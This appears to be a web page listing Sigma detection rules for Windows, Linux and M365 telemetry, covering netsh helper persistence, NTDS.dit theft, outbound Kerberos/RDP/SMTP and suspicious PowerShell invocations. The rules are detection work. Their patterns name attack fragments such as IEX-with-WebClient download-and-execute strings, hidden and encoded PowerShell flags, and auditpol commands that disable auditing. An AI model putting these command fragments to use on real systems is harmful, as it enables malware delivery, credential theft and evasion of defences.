<li><a href="#">title:Suspicious Netsh DLL Persistence id: 56321594-9087-49d9-bf10-524fe8479452 status: test description: Detects persitence via netsh helper author: Victor Sergeev, oscd.community references: - - date: 2019/10/25 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\netsh.exe' CommandLine|contains|all: - 'add' - 'helper' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1546.007 - attack.s0108 
<li><a href="#">title:Suspicious Network Command id: a29c1813-ab1f-4dde-b489-330b952e91ae status: experimental description: Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems references: - author: frack113, Christopher Peacock '@securepeacock', SCYTHE '@scythe_io' date: 2021/12/07 modified: 2022/04/11 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - 'ipconfig /all' - 'netsh interface show interface' - 'arp -a' - 'nbtstat -n' - 'net config' - 'route print' condition: selection falsepositives: - Administrator, hotline ask to user level: low tags: - attack.discovery - attack.t1016 
<li><a href="#">title:Suspicious Network Connection Binary No CommandLine id: 20384606-a124-4fec-acbb-8bd373728613 status: experimental description: Detects suspicious network connections made by a well-known Windows binary run with no command line parameters author: Florian Roth references: - date: 2022/07/03 logsource: category: network_connection product: windows detection: selection: Initiated: 'true' Image|endswith: - '\regsvr32.exe' - '\rundll32.exe' - '\dllhost.exe' CommandLine|endswith: - '\regsvr32.exe' - '\rundll32.exe' - '\dllhost.exe' filter_no_cmdline: CommandLine: '' filter_null: # e.g. Sysmon has no CommandLine field in network events with ID 3 CommandLine: null condition: selection and not 1 of filter* falsepositives: - Unknown level: high tags: - attack.defense_evasion 
<li><a href="#">title:Suspicious New Printer Ports in Registry (CVE-2020-1048) id: 7ec912f2-5175-4868-b811-ec13ad0f8567 status: test description: Detects a new and suspicious printer port creation in Registry that could be an attempt to exploit CVE-2020-1048 author: EagleEye Team, Florian Roth, NVISO references: - date: 2020/05/13 modified: 2022/01/13 logsource: product: windows category: registry_set detection: selection: EventType: SetValue TargetObject|startswith: 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Ports' Details|contains: - '.dll' - '.exe' - '.bat' - '.com' - 'C:' condition: selection falsepositives: - New printer port install on host level: high tags: - attack.persistence - attack.execution - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Suspicious New-PSDrive to Admin Share id: 1c563233-030e-4a07-af8c-ee0490a66d3a description: Adversaries may use to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user. references: - - status: experimental author: frack113 date: 2022/01/01 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - 'New-PSDrive' - '-psprovider ' - 'filesystem' - '-root ' - '\\' - '$' condition: selection falsepositives: - Unknown level: medium tags: - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:Suspicious Nmap Execution id: f6ecd1cf-19b8-4488-97f6-00f0924991a3 status: experimental description: Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation author: frack113 references: - - date: 2021/12/10 logsource: category: process_creation product: windows detection: selection: OriginalFileName: nmap.exe condition: selection falsepositives: - Network administator computeur level: high tags: - attack.discovery - attack.t1046 
<li><a href="#">title:Suspicious Non PowerShell WSMAN COM Provider id: df9a0e0e-fedb-4d6c-8668-d765dfc92aa7 description: Detects suspicious use of the WSMAN provider without PowerShell.exe as the host application. status: experimental date: 2020/06/24 modified: 2021/08/30 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1059.001 - attack.lateral_movement - attack.t1021.003 references: - - - logsource: product: windows service: powershell-classic definition: fields have to be extract from event detection: selection: ProviderName: WSMan filter: HostApplication|contains: powershell condition: selection and not filter falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious NT Resource Kit Auditpol Usage id: c6c56ada-612b-42d1-9a29-adad3c5c2c1e description: Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor. status: experimental author: Nasreddine Bencherchali @nas_bench references: - date: 2021/12/18 tags: - attack.defense_evasion - attack.t1562.002 level: high logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - '/logon:none' - '/system:none' - '/sam:none' - '/privilege:none' - '/object:none' - '/process:none' - '/policy:none' condition: selection falsepositives: - Unknown 
<li><a href="#">title:Suspicious Ntdll Pipe Redirection id: bbc865e4-7fcd-45a6-8ff1-95ced28ec5b2 status: experimental description: Detects command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection references: - tags: - attack.defense_evasion author: Florian Roth date: 2022/03/05 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - 'type %windir%\system32\ntdll.dll' - 'type %systemroot%\system32\ntdll.dll' - 'type c:\windows\system32\ntdll.dll' - '\\ntdll.dll > \\\\.\\pipe\\' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious NTDS Exfil Filename Patterns id: 3a8da4e0-36c1-40d2-8b29-b3e890d5172a description: Detects suspicious creations of files with names used in various tools that export the NTDS.DIT for exfiltration status: experimental author: Florian Roth references: - - - date: 2022/03/11 tags: - attack.credential_access - attack.t1003.003 logsource: product: windows category: file_event detection: selection_file: TargetFilename|endswith: - '\All.cab' # - '.ntds.cleartext' # condition: selection_file falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious NTDS.DIT Creation id: 4e7050dd-e548-483f-b7d6-527ab4fa784d description: Detects suspicious creations of a file named ntds.dit, e.g. by a PowerShell parent or in a suspicious directory or a suspicious one liner status: experimental author: Florian Roth references: - - - - date: 2022/03/11 tags: - attack.credential_access - attack.t1003.003 logsource: product: windows category: file_event detection: selection_file: TargetFilename|endswith: '\ntds.dit' selection_process: - ParentImage|endswith: - '\powershell.exe' - '\wscript.exe' - '\cscript.exe' - '\w3wp.exe' - '\php-cgi.exe' - '\nginx.exe' - '\httpd.exe' - ParentImage|contains: - '\apache' - '\tomcat' - '\AppData\' - '\Temp\' - '\Public\' - '\PerfLogs\' - Image|contains: - '\AppData\' - '\Temp\' - '\Public\' - '\PerfLogs\' condition: selection_file and 1 of selection_process* falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious OAuth App File Download Activities id: ee111937-1fe7-40f0-962a-0eb44d57d174 status: experimental description: Detects when a Microsoft Cloud App Security reported when an app downloads multiple files from Microsoft SharePoint or Microsoft OneDrive in a manner that is unusual for the user. author: Austin Songer @austinsonger date: 2021/08/23 references: - - logsource: service: threat_management product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'Suspicious OAuth app file download activities' status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.exfiltration 
<li><a href="#">title:Suspicious OfflineScannerShell.exe Execution From Another Folder id: 02b18447-ea83-4b1b-8805-714a8a34546a status: experimental description: Use OfflineScannerShell.exe to execute mpclient.dll library in the current working directory references: - author: frack113 date: 2022/03/06 logsource: category: process_creation product: windows detection: lolbas: Image|endswith: '\OfflineScannerShell.exe' filter_correct: CurrentDirectory: 'C:\Program Files\Windows Defender\Offline\' filter_missing: CurrentDirectory: null condition: lolbas and not 1 of filter_* falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:Suspicious OpenSSH Daemon Error id: e76b413a-83d0-4b94-8e4c-85db4a5b8bdc status: test description: Detects suspicious SSH / SSHD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts author: Florian Roth references: - - date: 2017/06/30 modified: 2021/11/27 logsource: product: linux service: sshd detection: keywords: - '*unexpected internal error*' - '*unknown or unsupported key type*' - '*invalid certificate signing key*' - '*invalid elliptic curve value*' - '*incorrect signature*' - '*error in libcrypto*' - '*unexpected bytes remain after decoding*' - '*fatal: buffer_get_string: bad string*' - '*Local: crc32 compensation attack*' - '*bad client public DH value*' - '*Corrupted MAC on input*' condition: keywords falsepositives: - Unknown level: medium tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:Suspicious Outbound Kerberos Connection id: e54979bd-c5f9-4d6c-967b-a04b19ac4c74 status: test description: Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation. author: Ilyas Ochkov, oscd.community references: - date: 2019/10/24 modified: 2021/12/02 logsource: category: network_connection product: windows detection: selection: DestinationPort: 88 Initiated: 'true' filter: Image|endswith: - '\lsass.exe' - '\opera.exe' - '\chrome.exe' - '\firefox.exe' - '\tomcat\bin\tomcat8.exe' condition: selection and not filter falsepositives: - Other browsers level: high tags: - attack.credential_access - attack.t1558 - attack.lateral_movement - attack.t1550.003 
<li><a href="#">title:Suspicious Outbound Kerberos Connection id: eca91c7c-9214-47b9-b4c5-cb1d7e4f2350 status: test description: Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation. author: Ilyas Ochkov, oscd.community references: - date: 2019/10/24 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5156 DestinationPort: 88 filter: Image|endswith: - '\lsass.exe' - '\opera.exe' - '\chrome.exe' - '\firefox.exe' condition: selection and not filter falsepositives: - Other browsers level: high tags: - attack.lateral_movement - attack.t1558.003 
<li><a href="#">title:Suspicious Outbound RDP Connections id: ed74fe75-7594-4b4b-ae38-e38e3fd2eb23 status: test description: Detects Non-Standard Tools Connecting to TCP port 3389 indicating possible lateral movement author: Markus Neis - Swisscom references: - date: 2019/05/15 modified: 2022/06/20 logsource: category: network_connection product: windows detection: selection: DestinationPort: 3389 Initiated: 'true' filter: - Image|endswith: - '\mstsc.exe' - '\RTSApp.exe' - '\RTS2App.exe' - '\RDCMan.exe' - '\ws_TunnelService.exe' - '\RSSensor.exe' - '\RemoteDesktopManagerFree.exe' - '\RemoteDesktopManager.exe' - '\RemoteDesktopManager64.exe' - '\mRemoteNG.exe' - '\mRemote.exe' - '\Terminals.exe' - '\spiceworks-finder.exe' - '\FSDiscovery.exe' - '\FSAssessment.exe' - '\MobaRTE.exe' - '\chrome.exe' - '\System32\dns.exe' - '\thor.exe' - '\thor64.exe' - '\Passwordstate.exe' - '\Avast Software\Avast\AvastSvc.exe' - '\Ranger\SentinelRanger.exe' # sentinel one - '\Avast\AvastSvc.exe' - Image|startswith: 'C:\Program Files\SplunkUniversalForwarder\bin\' condition: selection and not filter falsepositives: - Other Remote Desktop RDP tools - Domain controller using dns.exe level: high tags: - attack.lateral_movement - attack.t1021.001 - car.2013-07-002 
<li><a href="#">title:Suspicious Outbound SMTP Connections id: 9976fa64-2804-423c-8a5b-646ade840773 status: experimental description: | Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. references: - - author: frack113 date: 2022/01/07 modified: 2022/02/16 logsource: category: network_connection product: windows detection: selection: DestinationPort: - 25 - 587 - 465 - 2525 Initiated: 'true' filter_clients: Image|endswith: - \thunderbird.exe - \outlook.exe filter_mailserver: Image|startswith: 'C:\Program Files\Microsoft\Exchange Server\' condition: selection and not 1 of filter* falsepositives: - Other SMTP tools level: medium tags: - attack.exfiltration - attack.t1048.003 
<li><a href="#">title:Suspicious Parent of Csc.exe id: b730a276-6b63-41b8-bcf8-55930c8fc6ee status: test description: Detects a suspicious parent of csc.exe, which could by a sign of payload delivery author: Florian Roth references: - date: 2019/02/11 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\csc.exe' ParentImage|endswith: - '\wscript.exe' - '\cscript.exe' - '\mshta.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.005 - attack.t1059.007 - attack.defense_evasion - attack.t1218.005 - attack.t1027.004 
<li><a href="#">title:Suspicious PFX File Creation id: dca1b3e8-e043-4ec8-85d7-867f334b5724 status: test description: A general detection for processes creating PFX files. This could be an indicator of an adversary exporting a local certificate to a PFX file. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - date: 2020/05/02 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: '.pfx' condition: selection falsepositives: - System administrators managing certififcates. level: medium tags: - attack.credential_access - attack.t1552.004 
<li><a href="#">title:Suspicious Plink Remote Forwarding id: 48a61b29-389f-4032-b317-b30de6b95314 status: experimental description: Detects suspicious Plink tunnel remote forarding to a local port references: - - author: Florian Roth date: 2021/01/19 tags: - attack.command_and_control - attack.t1572 - attack.lateral_movement - attack.t1021.001 logsource: category: process_creation product: windows detection: selection: Description: 'Command-line SSH, Telnet, and Rlogin client' CommandLine|contains: ' -R ' condition: selection falsepositives: - Administrative activity using a remote port forwarding to a local port level: high 
<li><a href="#">title:Suspicious PowerShell Cmdline id: b6b49cd1-34d6-4ead-b1bf-176e9edba9a4 status: test description: Detects the PowerShell command lines with reversed strings author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton references: - - date: 2020/10/11 modified: 2022/02/21 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\powershell.exe' CommandLine|contains: - 'hctac' - 'kearb' - 'dnammoc' - 'ekovn' - 'eliFd' - 'rahc' - 'etirw' - 'golon' - 'tninon' - 'eddih' - 'tpircS' - 'ssecorp' - 'llehsrewop' - 'esnopser' - 'daolnwod' - 'tneilCbeW' - 'tneilc' - 'ptth' - 'elifotevas' - '46esab' - 'htaPpmeTteG' - 'tcejbO' - 'maerts' - 'hcaerof' - 'ekovni' - 'retupmoc' filter_1: CommandLine|contains: '-EncodedCommand' condition: selection and not 1 of filter* falsepositives: - Unlikely level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Suspicious PowerShell Command Line id: d7bcd677-645d-4691-a8d4-7a5602b780d1 status: test description: Detects the PowerShell command lines with special characters author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton (fp) references: - date: 2020/10/15 modified: 2022/03/08 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\powershell.exe' CommandLine|re: '.*\+.*\+.*\+.*\+.*\+.*\+.*\+.*\+.*\+.*\+.*\+.*\+.*\+.*\+.*' selection2: Image|endswith: '\powershell.exe' CommandLine|re: '.*\{.*\{.*\{.*\{.*\{.*\{.*\{.*\{.*\{.*\{.*' selection3: Image|endswith: '\powershell.exe' CommandLine|re: '.*\{' selection4: Image|endswith: '\powershell.exe' CommandLine|re: '.*\^.*\^.*\^.*\^.*\^.*' selection5: Image|endswith: '\powershell.exe' CommandLine|re: '.*`.*`.*`.*`.*`.*' filter_amazonSSM: ParentImage: C:\Program Files\Amazon\SSM\ssm-document-worker.exe filter_windef_atp: CommandLine|contains: - 'new EventSource("Microsoft.Windows.Sense.Client.Management"' - 'public static extern bool InstallELAMCertificateInfo(SafeFileHandle handle);' condition: (selection1 or selection2 or selection3 or selection4 or selection5) and not filter_amazonSSM and not (selection3 and filter_windef_atp) falsepositives: - Unlikely - Amazon SSM Document Worker # fp example: powershell " [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 $keyExists = Test-Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\OC Manager\Subcomponents" $jsonObj = @() if ($keyExists) { $key = Get-Item "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\OC Manager\Subcomponents" $valueNames = $key.GetValueNames(); foreach ($valueName in $valueNames) { $value = $key.GetValue($valueName); if ($value -gt 0) { $installed = "True" } else { $installed = "False" } $jsonObj += @" {"Name": "$valueName", "Installed": "$installed"} "@ } } $result = $jsonObj -join "," $result = "[" + $result + "]" [Console]::WriteLine($result) - Windows Defender ATP level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Suspicious PowerShell Download and Execute Pattern id: e6c54d94-498c-4562-a37c-b469d8e9a275 status: experimental description: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive) author: Florian Roth references: - date: 2022/02/28 modified: 2022/03/01 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: # make sure that your backend applies the strings case-insensitive - 'IEX ((New-Object Net.WebClient).DownloadString' - 'IEX (New-Object Net.WebClient).DownloadString' - 'IEX((New-Object Net.WebClient).DownloadString' - 'IEX(New-Object Net.WebClient).DownloadString' - ' -command (New-Object System.Net.WebClient).DownloadFile(' - ' -c (New-Object System.Net.WebClient).DownloadFile(' condition: selection falsepositives: - Software installers that pull packages from remote systems and execute them level: high tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Suspicious PowerShell Download id: 3236fcd0-b7e3-4433-b4f8-86ad61a9af2d related: - id: 65531a81-a694-4e31-ae04-f8ba5bc33759 type: derived status: experimental description: Detects suspicious PowerShell download command tags: - attack.execution - attack.t1059.001 author: Florian Roth date: 2017/03/05 modified: 2021/10/16 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: downloadfile: HostApplication|contains|all: - 'System.Net.WebClient' - '.DownloadFile(' downloadstring: HostApplication|contains|all: - 'System.Net.WebClient' - '.DownloadString(' condition: downloadfile or downloadstring falsepositives: - PowerShell scripts that download content from the Internet level: medium 
<li><a href="#">title:Suspicious PowerShell Download id: 403c2cc0-7f6b-4925-9423-bfa573bed7eb related: - id: 65531a81-a694-4e31-ae04-f8ba5bc33759 type: derived status: experimental description: Detects suspicious PowerShell download command tags: - attack.execution - attack.t1059.001 author: Florian Roth date: 2017/03/05 modified: 2021/10/18 logsource: product: windows category: ps_script detection: webclient: ScriptBlockText|contains: 'System.Net.WebClient' download: ScriptBlockText|contains: - '.DownloadFile(' - '.DownloadString(' condition: webclient and download falsepositives: - PowerShell scripts that download content from the Internet level: medium 
<li><a href="#">title:Suspicious PowerShell Download id: de41232e-12e8-49fa-86bc-c05c7e722df9 related: - id: 65531a81-a694-4e31-ae04-f8ba5bc33759 type: derived status: experimental description: Detects suspicious PowerShell download command tags: - attack.execution - attack.t1059.001 author: Florian Roth date: 2017/03/05 modified: 2021/10/18 logsource: product: windows category: ps_module detection: webclient: ContextInfo|contains: 'System.Net.WebClient' download: ContextInfo|contains: - '.DownloadFile(' - '.DownloadString(' condition: webclient and download falsepositives: - PowerShell scripts that download content from the Internet level: medium 
<li><a href="#">title:Suspicious PowerShell Encoded Command Patterns id: b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c status: experimental description: Detects PowerShell command line patterns in combincation with encoded commands that often appear in malware infection chains author: Florian Roth references: - date: 2022/05/24 tags: - attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: encoded: Image|endswith: '\powershell.exe' CommandLine|contains: - ' -e ' - ' -en ' - ' -enc ' - ' -enco' selection: CommandLine|contains: - ' JAB' - ' SUVYI' - ' SQBFAFgA' - ' aWV4I' - ' IAB' - ' PAA' - ' aQBlAHgA' condition: encoded and selection falsepositives: - Other tools that work with encoded scripts in the command line instead of script files level: high 
<li><a href="#">title:Suspicious PowerShell Get Current User id: 4096a49c-7de4-4da0-a230-c66ccd56ea5a status: experimental description: Detects the use of PowerShell to identify the current logged user. date: 2022/04/04 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - '[System.Environment]::UserName' - '$env:UserName' - '[System.Security.Principal.WindowsIdentity]::GetCurrent()' condition: selection falsepositives: - Legitimate PowerShell scripts level: low tags: - attack.discovery - attack.t1033 
<li><a href="#">title:Suspicious PowerShell IEX Execution Patterns id: 09576804-7a05-458e-a817-eb718ca91f54 status: experimental description: Detects suspicious ways to run Invoke-Execution using IEX acronym author: Florian Roth date: 2022/03/24 modified: 2022/03/28 references: - logsource: product: windows category: process_creation detection: selection_combined_1: Image|endswith: '\powershell.exe' CommandLine|contains: -' | iex;' -' | iex ' -' | iex}' -' | IEX;' -' | IEX ;' -' | IEX -Error' -' | IEX (new' -' | IEX (New' -');IEX ' selection_combined_2: CommandLine|contains: - '::FromBase64String' - '.GetString([System.Convert]::' selection_standalone: CommandLine|contains: -')|iex;$' -')|IEX;$' -');iex($' -');iex $' -' | IEX | ' condition: all of selection_combined* or selection_standalone falsepositives: - Legitimate scripts that use IEX level: high 
<li><a href="#">title:Suspicious PowerShell Invocation Based on Parent Process id: 95eadcb2-92e4-4ed1-9031-92547773a6db status: test description: Detects suspicious powershell invocations from interpreters or unusual programs author: Florian Roth references: - date: 2019/01/16 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - '\wscript.exe' - '\cscript.exe' Image|endswith: '\powershell.exe' falsepositive: CurrentDirectory|contains: '\Health Service State\' condition: selection and not falsepositive fields: - CommandLine - ParentCommandLine falsepositives: - Microsoft Operations Manager (MOM) - Other scripts level: medium tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Suspicious PowerShell Invocations - Generic id: bbb80e91-5746-4fbe-8898-122e2cafdbf4 related: - id: 3d304fda-78aa-43ed-975c-d740798a49c1 type: derived status: experimental description: Detects suspicious PowerShell invocation command parameters tags: - attack.execution - attack.t1059.001 author: Florian Roth (rule) date: 2017/03/12 modified: 2021/12/02 logsource: product: windows category: ps_module detection: selection_encoded: ContextInfo|contains: - ' -enc ' - ' -EncodedCommand ' selection_hidden: ContextInfo|contains: - ' -w hidden ' - ' -window hidden ' - ' -windowstyle hidden ' selection_noninteractive: ContextInfo|contains: - ' -noni ' - ' -noninteractive ' condition: all of selection* falsepositives: - Very special / sneaky PowerShell scripts level: high 
<li><a href="#">title:Suspicious PowerShell Invocations - Generic id: ed965133-513f-41d9-a441-e38076a0798f related: - id: 3d304fda-78aa-43ed-975c-d740798a49c1 type: derived status: experimental description: Detects suspicious PowerShell invocation command parameters tags: - attack.execution - attack.t1059.001 author: Florian Roth (rule) date: 2017/03/12 modified: 2021/12/02 logsource: product: windows category: ps_script detection: selection_encoded: ScriptBlockText|contains: - ' -enc ' - ' -EncodedCommand ' selection_hidden: ScriptBlockText|contains: - ' -w hidden ' - ' -window hidden ' - ' -windowstyle hidden ' selection_noninteractive: ScriptBlockText|contains: - ' -noni ' - ' -noninteractive ' condition: all of selection* falsepositives: - Very special / sneaky PowerShell scripts level: high 
<li><a href="#">title:Suspicious PowerShell Invocations - Specific id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090 related: - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c type: derived status: experimental description: Detects suspicious PowerShell invocation command parameters tags: - attack.execution - attack.t1059.001 author: Florian Roth (rule), Jonhnathan Ribeiro date: 2017/03/05 modified: 2022/02/21 logsource: product: windows category: ps_module definition: Script block logging must be enabled detection: selection_convert_b64: ContextInfo|contains|all: - '-nop' - ' -w ' - 'hidden' - ' -c ' - '[Convert]::FromBase64String' selection_iex: ContextInfo|contains|all: - ' -w ' - 'hidden' - '-noni' - '-nop' - ' -c ' - 'iex' - 'New-Object' selection_enc: ContextInfo|contains|all: - ' -w ' - 'hidden' - '-ep' - 'bypass' - '-Enc' selection_reg: ContextInfo|contains|all: - 'powershell' - 'reg' - 'add' - 'HKCU\software\microsoft\windows\currentversion\run' selection_webclient: ContextInfo|contains|all: - 'bypass' - '-noprofile' - '-windowstyle' - 'hidden' - 'new-object' - 'system.net.webclient' - '.download' selection_iex_webclient: ContextInfo|contains|all: - 'iex' - 'New-Object' - 'Net.WebClient' - '.Download' filter_chocolatey: ContextInfo|contains: - "(New-Object System.Net.WebClient).DownloadString('" - 'Write-ChocolateyWarning' condition: 1 of selection* and not 1 of filter* falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious PowerShell Invocations - Specific id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71 related: - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c type: derived status: experimental description: Detects suspicious PowerShell invocation command parameters tags: - attack.execution - attack.t1059.001 author: Florian Roth (rule), Jonhnathan Ribeiro date: 2017/03/05 modified: 2022/02/21 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: select_convert_b64: ScriptBlockText|contains|all: - '-nop' - ' -w ' - 'hidden' - ' -c ' - '[Convert]::FromBase64String' select_iex_selection: ScriptBlockText|contains|all: - ' -w ' - 'hidden' - '-noni' - '-nop' - ' -c ' - 'iex' - 'New-Object' select_enc_selection: ScriptBlockText|contains|all: - ' -w ' - 'hidden' - '-ep' - 'bypass' - '-Enc' select_reg_selection: ScriptBlockText|contains|all: - 'powershell' - 'reg' - 'add' - 'HKCU\software\microsoft\windows\currentversion\run' select_webclient_selection: ScriptBlockText|contains|all: - 'bypass' - '-noprofile' - '-windowstyle' - 'hidden' - 'new-object' - 'system.net.webclient' - '.download' select_iex_webclient: ScriptBlockText|contains|all: - 'iex' - 'New-Object' - 'Net.WebClient' - '.Download' filter_chocolatey: ScriptBlockText|contains: - "(New-Object System.Net.WebClient).DownloadString('" - "(New-Object System.Net.WebClient).DownloadString('')" - 'Write-ChocolateyWarning' condition: 1 of select* and not 1 of filter* falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious PowerShell Keywords id: 1f49f2ab-26bc-48b3-96cc-dcffbc93eadf status: experimental description: Detects keywords that could indicate the use of some PowerShell exploitation framework date: 2019/02/11 modified: 2021/10/16 author: Florian Roth, Perez Diego (@darkquassar) references: - - - - tags: - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled for 4104 detection: selection: ScriptBlockText|contains: - 'System.Reflection.Assembly.Load($' - '[System.Reflection.Assembly]::Load($' - '[Reflection.Assembly]::Load($' - 'System.Reflection.AssemblyName' - 'Reflection.Emit.AssemblyBuilderAccess' - 'Runtime.InteropServices.DllImportAttribute' - 'SuspendThread' - 'rundll32' # - 'FromBase64' - 'Invoke-WMIMethod' - '' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious PowerShell Mailbox Export to Share id: 889719ef-dd62-43df-86c3-768fb08dc7c0 status: experimental description: Detects a PowerShell New-MailboxExportRequest that exports a mailbox to a local share, as used in ProxyShell exploitations references: - - - author: Florian Roth date: 2021/08/07 modified: 2022/02/01 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'New-MailboxExport' - ' -Mailbox ' - ' -FilePath \\\\127.0.0.1\\C$' condition: selection falsepositives: - Unknown level: critical fields: - CommandLine - ParentCommandLine tags: - attack.persistence - attack.t1505.003 - attack.resource_development - attack.t1584.006 
<li><a href="#">title:Suspicious Powershell No File or Command id: b66474aa-bd92-4333-a16c-298155b120df status: experimental description: Detects suspicious powershell execution that ends with a common flag instead of a command or a filename to execute (could be a sign of implicit execution that uses files in WindowsApps directory) author: 'pH-T, Florian Roth' references: - date: 2022/04/08 logsource: product: windows category: process_creation detection: selection: CommandLine|endswith: - ' -windowstyle hidden"' - ' -windowstyle hidden' - " -windowstyle hidden'" - ' -w hidden"' - ' -w hidden' - " -w hidden'" - ' -ep bypass"' - ' -ep bypass' - " -ep bypass'" - ' -noni"' - ' -noni' - " -noni'" condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.persistence - attack.t1053.005 - attack.t1059.001 
<li><a href="#">title:Suspicious PowerShell Parameter Substring id: 36210e0d-5b19-485d-a087-c096088885f0 status: test description: Detects suspicious PowerShell invocation with a parameter substring author: Florian Roth (rule), Daniel Bohannon (idea), Roberto Rodriguez (Fix) references: - date: 2019/01/16 modified: 2022/02/23 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\Powershell.exe' CommandLine|contains: - ' -windowstyle h ' - ' -windowstyl h' - ' -windowsty h' - ' -windowst h' - ' -windows h' - ' -windo h' - ' -wind h' - ' -win h' - ' -wi h' - ' -win h ' - ' -win hi ' - ' -win hid ' - ' -win hidd ' - ' -win hidde ' - ' -NoPr ' - ' -NoPro ' - ' -NoProf ' - ' -NoProfi ' - ' -NoProfil ' - ' -nonin ' - ' -nonint ' - ' -noninte ' - ' -noninter ' - ' -nonintera ' - ' -noninterac ' - ' -noninteract ' - ' -noninteracti ' - ' -noninteractiv ' - ' -ec ' - ' -encodedComman ' - ' -encodedComma ' - ' -encodedComm ' - ' -encodedCom ' - ' -encodedCo ' - ' -encodedC ' - ' -encoded ' - ' -encode ' - ' -encod ' - ' -enco ' - ' -en ' - ' -executionpolic ' - ' -executionpoli ' - ' -executionpol ' - ' -executionpo ' - ' -executionp ' - ' -execution bypass' - ' -executio bypass' - ' -executi bypass' - ' -execut bypass' - ' -execu bypass' - ' -exec bypass' - ' -exe bypass' - ' -ex bypass' - ' -ep bypass' - ' /windowstyle h ' - ' /windowstyl h' - ' /windowsty h' - ' /windowst h' - ' /windows h' - ' /windo h' - ' /wind h' - ' /win h' - ' /wi h' - ' /win h ' - ' /win hi ' - ' /win hid ' - ' /win hidd ' - ' /win hidde ' - ' /NoPr ' - ' /NoPro ' - ' /NoProf ' - ' /NoProfi ' - ' /NoProfil ' - ' /nonin ' - ' /nonint ' - ' /noninte ' - ' /noninter ' - ' /nonintera ' - ' /noninterac ' - ' /noninteract ' - ' /noninteracti ' - ' /noninteractiv ' - ' /ec ' - ' /encodedComman ' - ' /encodedComma ' - ' /encodedComm ' - ' /encodedCom ' - ' /encodedCo ' - ' /encodedC ' - ' /encoded ' - ' /encode ' - ' /encod ' - ' /enco ' - ' /en ' - ' /executionpolic ' - ' /executionpoli ' - ' /executionpol ' - ' /executionpo ' - ' /executionp ' - ' /execution bypass' - ' /executio bypass' - ' /executi bypass' - ' /execut bypass' - ' /execu bypass' - ' /exec bypass' - ' /exe bypass' - ' /ex bypass' - ' /ep bypass' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 
